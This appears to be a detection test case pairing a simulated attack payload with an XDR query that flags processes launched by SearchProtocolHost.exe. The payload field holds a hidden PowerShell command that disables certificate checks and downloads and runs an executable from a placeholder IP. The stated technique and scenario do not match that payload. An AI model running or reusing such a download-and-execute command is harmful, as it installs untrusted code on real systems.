identity.name: Suspicious SearchProtocolHost.exe Parent Process Behavior
identity.summary: An attacker leverages a malicious PowerShell script to spawn a SearchProtocolHost.exe process as a parent, which is indicative of suspicious lateral movement or persistence. Cortex should detect this
identity.description: An attacker leverages a malicious PowerShell script to spawn a SearchProtocolHost.exe process as a parent, which is indicative of suspicious lateral movement or persistence. Cortex should detect this abnormal parent-child process relationship.

techniques.name: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder

payload.code: powershell -WindowStyle Hidden -Command "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $client = New-Object System.Net.WebClient; $client.DownloadFile('http://192.0.2.5/malware.exe', 'C:\temp\malware.exe'); Start-Process -FilePath 'C:\temp\malware.exe' -WindowStyle Hidden"

expected_artifacts.description: PowerShell process spawning a malicious executable

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Suspicious SearchProtocolHost.exe parent process
biocs.description: Detection of a process launched by SearchProtocolHost.exe, which is unusual and typically associated with malicious activity
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter causality_actor_process_image_name = 'SearchProtocolHost.exe'
| filter action_process_image_name != 'SearchProtocolHost.exe'
| filter action_process_image_name != 'svchost.exe'
